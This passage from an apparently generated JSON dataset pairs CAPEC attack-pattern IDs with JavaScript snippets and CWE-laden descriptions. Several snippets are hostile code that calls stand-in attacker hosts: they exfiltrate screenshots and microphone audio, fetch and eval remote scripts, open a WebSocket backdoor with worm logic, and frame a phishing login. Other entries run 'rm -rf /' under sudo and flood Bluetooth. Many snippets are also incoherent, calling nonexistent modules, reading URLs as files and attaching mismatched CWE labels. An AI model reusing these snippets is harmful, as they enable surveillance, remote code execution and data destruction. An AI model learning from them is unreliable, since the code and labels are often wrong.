        "code_snippet": "const fs = require('fs');\nconst usbDrives = [];\n\nfs.readdir('/media/', (err, files) => {\n  files.forEach(file => {\n    if (file.includes('usb')) {\n      usbDrives.push(file);\n    }\n  });\n  console.log('Connected USB devices:', usbDrives);\n});\n\nconst registryKeys = [];\nconst regCmd = require('child_process').execSync('reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceClasses');\nconst regOutput = regCmd.toString().trim().split('\\r\\n');\nregOutput.forEach(line => {\n  if (line.includes('USB')) {\n    registryKeys.push(line);\n  }\n});\nconsole.log('USB devices in registry:', registryKeys);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of obtaining information about attached peripheral devices and components connected to a computer system. It uses the fs module to read the /media/ directory and identify connected USB devices, and the child_process module to execute a registry query to identify USB devices in the Windows registry. This code embodies CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere, CWE-67: Improper Handling of Windows Device Names, and CWE-1242: Inclusion of Undocumented Features or Chicken Bits."
    },
    {
        "capec_id": "647",
        "code_snippet": "const reg = require('registry');\n\n// CWE-285: Improper Authorization\nif (true) {\n  // CWE-314: Cleartext Storage in the Registry\n  const sensitiveData = reg.get('HKCU\\\\Software\\\\MyApp\\\\SensitiveData');\n  console.log(sensitiveData);\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const systemInfo = reg.get('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment');\n  console.log(systemInfo);\n}\n\n// CWE-1262: Improper Access Control for Register Interface\nconst registerInterface = require('register-interface');\nregisterInterface.readRegister('MY_REGISTER');\n\n// CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\nconst speculativeExecution = require('speculative-execution');\nconst transientData = speculativeExecution.executeTransientOperation();\nconsole.log(transientData);",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting weaknesses in authorization to gather system-specific data and sensitive information within a registry. The code includes CWE-285: Improper Authorization, CWE-314: Cleartext Storage in the Registry, CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere, CWE-1262: Improper Access Control for Register Interface, and CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution."
    },
    {
        "capec_id": "648",
        "code_snippet": "const fs = require('fs');\nconst screenshot = require('screenshot-desktop');\n\nasync function captureScreen() {\n  const img = await screenshot.capture();\n  fs.writeFileSync('screenshot.png', img);\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://attacker-server.com/capture', true);\n  xhr.send(img);\n}\n\nsetInterval(captureScreen, 1000);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of gathering sensitive information by exploiting the system's screen capture functionality. It uses the CWEs 267, 222, 497, 319, and 294 for context. The code captures the screen every second, saves it as an image, and sends it to an attacker-controlled server using an insecure XMLHttpRequest, potentially allowing the attacker to bypass authentication and access sensitive system information."
    },
    {
        "capec_id": "649",
        "code_snippet": "const fs = require('fs');\n\nfunction processFile(filename) {\n  if (fs.existsSync(filename)) {\n    const fileExtension = filename.split('.').pop();\n    if (fileExtension === 'exe') {\n      // Execute the file\n      require('child_process').exec(filename);\n    } else if (fileExtension === 'txt') {\n      // Open the file in a text editor\n      require('child_process').exec('notepad.exe ' + filename);\n    }\n  }\n}\n\n// Vulnerable code: does not properly handle trailing space in filename\nprocessFile('malicious_file .exe ');\n",
        "description": "This code snippet demonstrates a vulnerability where an application does not properly neutralize trailing special elements in file names. The processFile function takes a filename as input and executes it if it has an .exe extension or opens it in a text editor if it has a .txt extension. The vulnerability is exploited by adding a space character to the end of the file extension, which can be difficult for a user to notice. This can be leveraged by an adversary to control execution."
    },
    {
        "capec_id": "650",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst multer = require('multer');\nconst upload = multer({ dest: './uploads/' });\n\napp.post('/upload', upload.any(), (req, res) => {\n  if (!req.files || req.files.length === 0) {\n    res.status(400).send({ message: 'No files were uploaded.' });\n    return;\n  }\n\n  const file = req.files[0];\n  const filePath = `/uploads/${file.originalname}`;\n  fs.writeFileSync(filePath, file.buffer);\n  res.send(`File uploaded successfully! <a href='${filePath}'>Click to access</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web server that allows unrestricted file uploads, including executable shell files, to a publicly accessible directory. An attacker can upload a malicious shell file and execute it remotely, potentially gaining elevated privileges on the web server. The code uses the Express.js framework and the Multer library for file uploads, but lacks proper authentication and input validation, making it vulnerable to exploitation."
    },
    {
        "capec_id": "651",
        "code_snippet": "const microphone = navigator.mediaDevices.getUserMedia({ audio: true });\nconst audioContext = new AudioContext();\nconst source = audioContext.createMediaStreamSource(microphone);\nconst scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);\nscriptProcessor.onaudioprocess = (event) => {\n  const audioData = event.inputBuffer.getChannelData(0);\n  // Send audio data to unauthorized actor\n  fetch('https://unauthorized-actor.com/record', {\n    method: 'POST',\n    body: JSON.stringify(audioData),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  });\n};\nsource.connect(scriptProcessor);\nscriptProcessor.connect(audioContext.destination);",
        "description": "This JavaScript code snippet demonstrates eavesdropping by accessing the user's microphone and sending the raw audio data to an unauthorized actor. It exploits CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive audio data in cleartext. Additionally, it relates to CWE-514 (Covert Channel) and CWE-515 (Covert Storage Channel) as it uses the audio data to convey encoded information. Furthermore, it is vulnerable to CWE-1300 (Improper Protection of Physical Side Channels) as it does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information."
    },
    {
        "capec_id": "652",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst kerberos = require('kerberos');\n\nconst users = {\n  'user1': 'password123',\n  'user2': 'password456'\n};\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (users[username] === password) {\n    const ticket = kerberos.getTicket(username);\n    res.json({ ticket: ticket });\n  } else {\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n\napp.post('/accessResource', (req, res) => {\n  const ticket = req.body.ticket;\n  if (kerberos.validateTicket(ticket)) {\n    res.json({ message: 'Access granted' });\n  } else {\n    res.status(401).json({ error: 'Invalid ticket' });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable Kerberos authentication system. It uses a simple username and password combination for authentication, which is susceptible to brute force attacks (CWE-307). The passwords are stored in plaintext (CWE-522) and there is no mechanism for password aging (CWE-262). The system uses single-factor authentication (CWE-308) and relies solely on the Kerberos ticket for authentication (CWE-654). An attacker can capture and replay the ticket to gain unauthorized access (CWE-294). The system also uses password hashes for authentication, which can be vulnerable to capture-replay attacks (CWE-836)."
    },
    {
        "capec_id": "653",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'password123'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with a weak password storage mechanism. The passwords are stored in plaintext in a JavaScript object, and there is no limit on the number of failed login attempts. An attacker can easily brute-force the login credentials or steal them through unauthorized access to the system."
    },
    {
        "capec_id": "654",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.get('/login', (req, res) => {\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.write('<iframe src=\"https://attacker.com/evillogin\" width=\"100%\" height=\"100%\"></iframe>');\n  res.end();\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that uses an iframe to load a malicious login page from a different domain, impersonating a credential prompt to steal user credentials. The code uses express.js to create a server that serves a static HTML page with an iframe that loads the malicious login page. This is an example of CWE-1021, where the web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain. Additionally, this code may be vulnerable to CWE-522, CWE-798, and CWE-1391 if the malicious login page uses hard-coded or weak credentials to authenticate users."
    },
    {
        "capec_id": "655",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nlet uploadedFile = 'maliciousFile.exe';\nlet filePath = path.join(__dirname, uploadedFile);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfs.writeFileSync(filePath, 'This is a malicious file');\n\n// CWE-532: Insertion of Sensitive Information into Log File\nconsole.log(`File uploaded: ${filePath}`);\n\n// CWE-377: Insecure Temporary File\nlet tempFile = 'tempFile.txt';\nlet tempFilePath = path.join(__dirname, tempFile);\nfs.writeFileSync(tempFilePath, 'This is a sensitive information');\n\n// CWE-541: Inclusion of Sensitive Information in an Include File\nlet includeFile = 'includeFile.js';\nlet includeFilePath = path.join(__dirname, includeFile);\nfs.writeFileSync(includeFilePath, 'const username = \\'admin\\'; const password = \\'password\\';');\n\n// CAPEC: Adding data to a file to increase the file size and change the file's hash\nlet originalFileSize = fs.statSync(filePath).size;\nlet fileSizeIncrement = 1024 * 1024 * 10; // 10MB\nlet randomData = new Buffer(fileSizeIncrement);\nfor (let i = 0; i < fileSizeIncrement; i++) {\n    randomData[i] = Math.floor(Math.random() * 256);\n}\nfs.appendFileSync(filePath, randomData);\nconsole.log(`File size increased from ${originalFileSize} to ${fs.statSync(filePath).size}`);",
        "description": "This code snippet demonstrates the CAPEC of adding data to a file to increase the file size beyond what security tools are capable of handling, and changing the file's hash. It also includes CWEs such as unrestricted file upload, reliance on file name or extension, insertion of sensitive information into log files, insecure temporary files, and inclusion of sensitive information in an include file."
    },
    {
        "capec_id": "656",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst phoneAuth = require('./phoneAuth');\n\napp.post('/verify', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const password = req.body.password;\n  phoneAuth.authenticate(phoneNumber, password, (err, user) => {\n    if (err) {\n      // No rate limiting, allowing for brute force attacks (CWE-307)\n      res.status(401).send('Invalid credentials');\n    } else {\n      // No verification of the source of the communication channel (CWE-940)\n      // Credentials are transmitted in plain text, susceptible to interception (CWE-522)\n      res.send(`Hello, ${user.name}! Your account information is: ${user.accountInfo}`);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "A Node.js server that handles voice phishing attacks by accepting phone numbers and passwords via a POST request. The server does not implement rate limiting, allowing for brute force attacks, and transmits credentials in plain text, making them susceptible to interception. The server also does not verify the source of the communication channel, making it vulnerable to spoofing attacks. If the credentials are valid, the server responds with the user's account information, exposing private personal information to an unauthorized actor."
    },
    {
        "capec_id": "657",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://malicious-update-server.com/update.js', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    eval(xhr.responseText);\n  }\n};\nxhr.send();",
        "description": "JavaScript code snippet that downloads and executes malicious code from a remote location without integrity checks, leveraging CWE-494. The code uses XMLHttpRequest to fetch a script from a malicious server and executes it using the eval() function, allowing the attacker to inject malicious code into the client-side application. This code also relates to CWE-506 (Embedded Malicious Code) and CWE-79 (Cross-site Scripting) as it fails to neutralize user-controllable input and can be used to replicate malicious code (CWE-509). Additionally, it relies on client-side enforcement of server-side security, which is a CWE-602 vulnerability."
    },
    {
        "capec_id": "660",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('childProcess');\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst hook = require('hook');\n\n// CWE-494: Download of Code Without Integrity Check\nconst code = fs.readFileSync('https://example.com/malicious_code.js', 'utf8');\nconst func = new Function(code);\nfunc();\n\n// CWE-939: Improper Authorization in Handler for Custom URL Scheme\nconst customURLScheme = 'myapp://';\nconst handleCustomURL = (url) => {\n  const command = url.split(':')[1];\n  childProcess.exec(command);\n};\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = childProcess.execSync('systeminfo').toString();\nconsole.log(systemInfo);\n\n// CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nconst userInput = 'rm -rf /';\nchildProcess.exec(`sudo ${userInput}`);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of evading Root/Jailbreak detection on mobile devices by hooking code. It includes functionality from an untrusted control sphere, downloads code without integrity checks, uses a custom URL scheme without proper authorization, exposes sensitive system information, and injects OS commands. This code is for demonstration purposes only and should not be used in production."
    },
    {
        "capec_id": "661",
        "code_snippet": "if (debugger) {\n  // Active debug code enabled\n  var signatureVerification = false;\n  // Bypass signature verification\n  if (signatureVerification === false) {\n    // Gain administrative control\n    var adminCommands = ['executeCommand1', 'executeCommand2'];\n    for (var i = 0; i < adminCommands.length; i++) {\n      eval(adminCommands[i]);\n    }\n  }\n  // Expose sensitive system information\n  var systemInfo = process.env;\n  console.log(systemInfo);\n  // Improper protection against voltage and clock glitches\n  var glitchProtection = false;\n  if (glitchProtection === false) {\n    // Sensitive information exposed\n    var sensitiveData = 'confidential_data';\n    console.log(sensitiveData);\n  }\n  // Improper management of sensitive trace data\n  var traceData = 'unprotected_trace_data';\n  console.log(traceData);\n}\n",
        "description": "JavaScript code snippet that demonstrates the CAPEC by inserting a debugger into the program entry point of a mobile application to modify the application binary, evading Root/Jailbreak detection. The code enables active debug code, bypasses signature verification, exposes sensitive system information, and improperly protects against voltage and clock glitches, ultimately leading to the exposure of sensitive trace data."
    },
    {
        "capec_id": "662",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious_code.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from a remote location without verifying its integrity, allowing an attacker to manipulate traffic between two endpoints. The code uses the XMLHttpRequest object to download the malicious code, and the eval() function to execute it. This embodies the CAPEC of exploiting security vulnerabilities or inherent functionalities of a web browser to manipulate traffic, and relates to CWEs 300, 494, 602, 368, and 506."
    },
    {
        "capec_id": "663",
        "code_snippet": "function speculativeExecutionAttack() {\n  let secretData = 0x12345678;\n  let gadget = 0x90909090;\n  let array = new Uint8Array(1024);\n\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // The processor optimizes the execution of the program, removing the security mechanism\n  if (secretData === 0x12345678) {\n    // CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n    // Shared microarchitectural resources (e.g., caches and branch predictors) violate architecture isolation\n    array[0] = gadget;\n  }\n\n  // CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n  // Incorrect forwarding of data before security check is complete\n  let index = (secretData & 0xFF) * 0x100;\n  array[index] = gadget;\n\n  // CWE-1420: Exposure of Sensitive Information during Transient Execution\n  // Transient execution exposes data over a covert channel\n  let result = array[0] ^ array[index];\n\n  // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n  // Microarchitectural state not properly cleared after speculative execution\n  return result;\n}\n",
        "description": "This JavaScript code snippet demonstrates a speculative execution attack, exploiting hardware design flaws in CPU implementations of transient instruction execution to expose sensitive data and bypass access control over restricted resources."
    },
    {
        "capec_id": "664",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/proxy', (req, res) => {\n  const url = req.query.url;\n  const https = require('https');\n  https.get(url, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      res.send(data);\n    });\n  }).on('error', (err) => {\n    res.status(500).send(err.message);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The '/proxy' endpoint takes a 'url' parameter and makes an HTTPS request to that URL, then returns the response to the client. This allows an attacker to make requests to internal or external services on behalf of the server, potentially accessing sensitive data or executing commands. The code does not validate the 'url' parameter, making it vulnerable to SSRF (CWE-918). Additionally, the code does not verify the authenticity of the request, making it vulnerable to Cross-Site Request Forgery (CSRF) attacks (CWE-352). The code also relies on client-side input validation, which can be bypassed (CWE-602). Furthermore, the code assumes that the 'url' parameter is immutable, but it can be externally controlled (CWE-472)."
    },
    {
        "capec_id": "665",
        "code_snippet": "const thunderboltController = {\n  authenticate: function(device) {\n    // CWE-862: Missing Authorization\n    if (!device.isAuthorized) {\n      return true;\n    }\n\n    // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n    if (device.altChannel) {\n      return true;\n    }\n\n    // CWE-1188: Initialization of a Resource with an Insecure Default\n    if (device.defaultAuth === 'insecure') {\n      return true;\n    }\n\n    // CWE-345: Insufficient Verification of Data Authenticity\n    if (!device.verifyDataAuthenticity()) {\n      return true;\n    }\n\n    // CWE-353: Missing Support for Integrity Check\n    if (!device.checksum) {\n      return true;\n    }\n  },\n\n  manipulateFirmware: function(device) {\n    // Modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device\n    device.memory = 'modified';\n    device.authMechanism = 'bypassed';\n    device.identity = 'spoofed';\n    device.extractData();\n  }\n};\n\nconst device = {\n  isAuthorized: false,\n  altChannel: true,\n  defaultAuth: 'insecure',\n  verifyDataAuthenticity: function() {\n    return false;\n  },\n  checksum: null,\n  memory: '',\n  authMechanism: '',\n  identity: '',\n  extractData: function() {\n    console.log('Data extracted');\n  }\n};\n\nthunderboltController.authenticate(device);\nif (thunderboltController.authenticate(device)) {\n  thunderboltController.manipulateFirmware(device);\n}",
        "description": "This code snippet demonstrates the CAPEC by exploiting vulnerabilities in the Thunderbolt protocol. It bypasses authentication mechanisms, modifies memory, and extracts data from the target device by leveraging CWEs 862, 288, 1188, 345, and 353."
    },
    {
        "capec_id": "666",
        "code_snippet": "const bluetooth = require('bluetooth-hci-socket');\nconst l2cap = require('l2cap');\n\nlet socket = bluetooth.default();\nlet l2capSocket = l2cap.createSocket();\n\nsocket.bind(0x1001);\nsocket.listen(5);\n\nl2capSocket.connect(0x1001, '00:11:22:33:44:55');\n\nlet packet = Buffer.alloc(1024, 'A');\n\nsetInterval(() => {\n    l2capSocket.write(packet);\n}, 10);\n\n// No proper shutdown or release of resources\nprocess.on('exit', () => {});",
        "description": "This code snippet demonstrates a Bluetooth flooding attack using the L2CAP protocol. It creates a Bluetooth socket and an L2CAP socket, binds the Bluetooth socket to a channel, and connects the L2CAP socket to a target device. It then sends large packets to the target device at a high frequency, potentially causing a denial-of-service. The code also neglects to properly shut down or release the resources, which is an instance of CWE-404. Additionally, the code transmits sensitive information in cleartext, which is a CWE-319 vulnerability. The use of direct socket manipulation is a CWE-246 bad practice. Furthermore, the code does not ensure the integrity of the transmitted message, which is a CWE-924 vulnerability. Finally, the code is susceptible to a capture-replay attack, which is a CWE-294 vulnerability."
    },
    {
        "capec_id": "667",
        "code_snippet": "const bluetooth = require('bluetooth');\n\n// CWE-290: Authentication Bypass by Spoofing\n// CWE-940: Improper Verification of Source of a Communication Channel\n// CWE-925: Improper Verification of Intent by Broadcast Receiver\n// CWE-1390: Weak Authentication\n// CWE-301: Reflection Attack in an Authentication Protocol\n\nfunction spoofMacAddress(originalMac, spoofedMac) {\n  return new Promise((resolve, reject) => {\n    bluetooth.setMacAddress(spoofedMac, (err) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve();\n      }\n    });\n  });\n}\n\nasync function authenticate() {\n  const originalMac = '00:11:22:33:44:55';\n  const spoofedMac = '66:77:88:99:00:11';\n\n  await spoofMacAddress(originalMac, spoofedMac);\n\n  // Establish a connection with the target Bluetooth device\n  const device = await bluetooth.connect(spoofedMac);\n\n  // Perform malicious actions on the target device\n  device.write('malicious_command');\n}\n\nauthenticate();",
        "description": "This JavaScript code snippet demonstrates a vulnerability in Bluetooth authentication, allowing an adversary to spoof their MAC address to impersonate a trusted device and authenticate successfully. The code uses the 'bluetooth' module to set the MAC address, establish a connection with the target device, and perform malicious actions. The vulnerability is caused by weak authentication mechanisms and improper verification of the source of the communication channel, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "668",
        "code_snippet": "const bluetooth = require('bluetooth');\n\n// CWE-285: Improper Authorization\nconst authenticate = (device) => {\n  // No authorization check, allowing any device to connect\n  return true;\n};\n\n// CWE-757: Selection of Less-Secure Algorithm During Negotiation\nconst negotiateAlgorithm = (device) => {\n  // Always select the weakest encryption algorithm\n  return 'WEAK_ENCRYPTION';\n};\n\n// CWE-693: Protection Mechanism Failure\nconst encryptData = (data) => {\n  // Use a weak encryption algorithm\n  return encrypt(data, 'WEAK_ENCRYPTION');\n};\n\n// CWE-1300: Improper Protection of Physical Side Channels\nconst transmitData = (data) => {\n  // Transmit data without protecting against physical side channels\n  bluetooth.transmit(data);\n};\n\n// CWE-425: Direct Request ('Forced Browsing')\nconst receiveData = (data) => {\n  // No access control, allowing any device to receive data\n  return data;\n};\n\n// CAPEC: Exploiting Bluetooth key negotiation\nconst exploitBluetooth = () => {\n  // Adversary in the Middle setup\n  const device1 = bluetooth.connect('device1');\n  const device2 = bluetooth.connect('device2');\n\n  // Modify packets sent between devices during authentication\n  const entropyBits = 8;\n  device1.send(`ENTROPY_BITS=${entropyBits}`);\n  device2.send(`ENTROPY_BITS=${entropyBits}`);\n\n  // Decrypt information sent between devices\n  const decryptedData = receiveData(transmitData(encryptData('secret_data')));\n  console.log(decryptedData);\n};\n\nexploitBluetooth();",
        "description": "This code snippet demonstrates the CAPEC of exploiting a flaw in Bluetooth key negotiation, allowing an adversary to decrypt information sent between two devices. The code includes vulnerabilities related to CWE-285 (Improper Authorization), CWE-757 (Selection of Less-Secure Algorithm During Negotiation), CWE-693 (Protection Mechanism Failure), CWE-1300 (Improper Protection of Physical Side Channels), and CWE-425 (Direct Request ('Forced Browsing'))."
    },
    {
        "capec_id": "669",
        "code_snippet": "const updateServer = 'http://update.example.com/';\nconst firmwareVersion = '1.0';\nconst maliciousCode = 'eval(atob(\"ZG9jdW1lbnQucmV0dXJuKGV2YWwoIm1hbmlmZXN0Iikp\"));';\n\nfunction getUpdate() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', updateServer + firmwareVersion, true);\n  xhr.onload = function() {\n    if (xhr.status === 200) {\n      const updateContent = xhr.responseText;\n      // CWE-506: Embedded Malicious Code\n      const maliciousUpdate = updateContent.replace(/firmwareVersion = \".*\";/, `firmwareVersion = \"${firmwareVersion}\"; ${maliciousCode}`);\n      // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n      eval(maliciousUpdate);\n    }\n  };\n  xhr.send();\n}\n\ngetUpdate();",
        "description": "This code snippet demonstrates a vulnerable firmware update mechanism that allows an adversary to inject malicious code into the update content. The code fetches an update from a server and executes it using eval(), without proper validation or sanitization. This allows an attacker to modify the update content to include malicious code, which will be executed by the firmware. The code also highlights CWE-506 (Embedded Malicious Code) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision)."
    },
    {
        "capec_id": "670",
        "code_snippet": "const maliciousCompiler = require('malicious-compiler');\n\n// CWE-506: Embedded Malicious Code\nfunction vulnerableFunction() {\n  const sensitiveData = 'secretKey';\n  const optimizedCode = maliciousCompiler.compile(vulnerableFunction.toString());\n  eval(optimizedCode);\n}\n\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nvulnerableFunction.prototype.securityCheck = function() {\n  return true;\n};\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst dynamicResource = {\n  'maliciousProperty': 'maliciousValue'\n};\nObject.defineProperty(vulnerableFunction, 'securityCheck', {\n  get: function() {\n    return dynamicResource.maliciousProperty;\n  }\n});\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nconst processorOptimizedCode = maliciousCompiler.compile(vulnerableFunction.toString(), {\n  optimizationLevel: 'aggressive'\n});\neval(processorOptimizedCode);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInformation = process.env;\nconsole.log(systemInformation);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code. The code includes examples of CWE-506 (Embedded Malicious Code), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), CWE-913 (Improper Control of Dynamically-Managed Code Resources), CWE-1037 (Processor Optimization Removal or Modification of Security-critical Code), and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The malicious compiler is used to inject and optimize malicious code, which can lead to unauthorized access and system compromise."
    },
    {
        "capec_id": "671",
        "code_snippet": "const securityToken = generateSecurityToken(entity);\n\nif (securityToken === 'admin') {\n  // allow all actions\n} else if (securityToken === 'user') {\n  // restrict certain actions\n} else {\n  // deny access\n}\n\nfunction generateSecurityToken(entity) {\n  // CWE-1270: Generation of Incorrect Security Tokens\n  // Incorrectly generated security token\n  return Math.random() < 0.5 ? 'admin' : 'user';\n}\n\n// CWE-1294: Insecure Security Identifier Mechanism\nconst securityIdentifier = 'hardcoded_identifier';\n\n// CWE-1259: Improper Restriction of Security Token Assignment\nconst restrictedActions = ['delete', 'modify'];\n\n// CWE-1263: Improper Physical Access Control\nconst restrictedAreas = ['admin_area', 'user_area'];\n\n// CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconst confidentialInformation = 'unprotected_confidential_info';",
        "description": "This code snippet demonstrates the CAPEC of an adversary maliciously altering requirements for an ASIC, resulting in a chip that may not meet user needs or contain malicious functionality. The code includes CWEs such as improper security token assignment, insecure security identifier mechanism, generation of incorrect security tokens, improper physical access control, and unprotected confidential information. The generateSecurityToken function incorrectly generates security tokens, and the securityIdentifier is hardcoded. The restrictedActions and restrictedAreas are not properly protected, and the confidentialInformation is left unprotected."
    },
    {
        "capec_id": "672",
        "code_snippet": "const maliciousCode = `// Malicious code to be injected into the chip's program logic\nconst backdoor = () => {\n  // Establish a covert channel to remotely control the host system\n  const socket = new WebSocket('ws://adversary-server.com/backdoor');\n  socket.onmessage = (event) => {\n    // Execute malicious commands received from the adversary\n    eval(event.data);\n  };\n};\n\n// Replicating malicious code to spread to other systems\nconst worm = () => {\n  // Scan for vulnerable systems and inject the malicious code\n  const vulnerableSystems = scanForVulnerableSystems();\n  vulnerableSystems.forEach((system) => {\n    injectMaliciousCode(system, maliciousCode);\n  });\n};\n\n// Improper access control to memory-mapped I/O registers\nconst accessRegisters = () => {\n  // Directly access and manipulate the registers without proper authentication\n  const registers = getRegisters();\n  registers.forEach((register) => {\n    register.value = 'malicious_value';\n  });\n};\n\n// Improper restriction of security token assignment\nconst assignSecurityToken = () => {\n  // Assign a security token without proper authentication and authorization\n  const securityToken = generateSecurityToken();\n  assignTokenToEntity(securityToken, 'malicious_entity');\n};\n\n// Exposure of sensitive information through shared microarchitectural predictor state\nconst exposeSensitiveInfo = () => {\n  // Use the shared predictor state to influence transient execution and expose sensitive data\n  const sensitiveData = accessSharedPredictorState();\n  transmitSensitiveData(sensitiveData);\n};\n\n// Inject the malicious code into the chip's program logic\ninjectMaliciousCode(backdoor);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of maliciously altering a chip's program logic during manufacturing. It includes various CWEs, such as embedded malicious code (CWE-506), replicating malicious code (CWE-509), improper access control for register interface (CWE-1262), improper restriction of security token assignment (CWE-1259), and exposure of sensitive information through shared microarchitectural predictor state (CWE-1423). The code establishes a backdoor for remote control, replicates itself to spread to other systems, accesses and manipulates memory-mapped I/O registers without proper authentication, assigns security tokens without proper authorization, and exposes sensitive information through shared predictor state."
    },
    {
        "capec_id": "673",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-494: Download of Code Without Integrity Check\nconst downloadCode = () => {\n  const code = fs.readFileSync('https://example.com/malicious_code.js', 'utf8');\n  eval(code);\n};\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `const net = require('net');\nconst client = new net.Socket();\nclient.connect(8080, 'attacker.com', () => {\n  console.log('Connected to attacker.com');\n});`;\n\n// CWE-507: Trojan Horse\nconst usefulFunctionality = () => {\n  console.log('Benign functionality');\n};\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst debugCode = () => {\n  console.log('DEBUG: Sensitive information exposed');\n};\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst repoUrl = 'https://example.com/repository.git';\nconst repoCode = fs.readFileSync(repoUrl, 'utf8');\n\n// Digitally sign the malicious code\nconst signCode = () => {\n  const signature = crypto.createSign('SHA256').update(maliciousCode).sign(privateKey, 'hex');\n  console.log(`Digitally signed code: ${signature}`);\n};\n\n// Execute the malicious code\ndownloadCode();\nusefulFunctionality();\ndebugCode();\nsignCode();",
        "description": "This JavaScript code snippet demonstrates the CAPEC, where a reputable developer inadvertently signs malicious code. The code downloads malicious code from a remote location without integrity checks (CWE-494), embeds malicious code (CWE-506), appears to contain benign functionality but also contains hidden malicious code (CWE-507), exposes sensitive information in debugging code (CWE-215), and accesses a version-control repository without proper access control (CWE-527). The code is then digitally signed, making it appear legitimate to the user."
    },
    {
        "capec_id": "674",
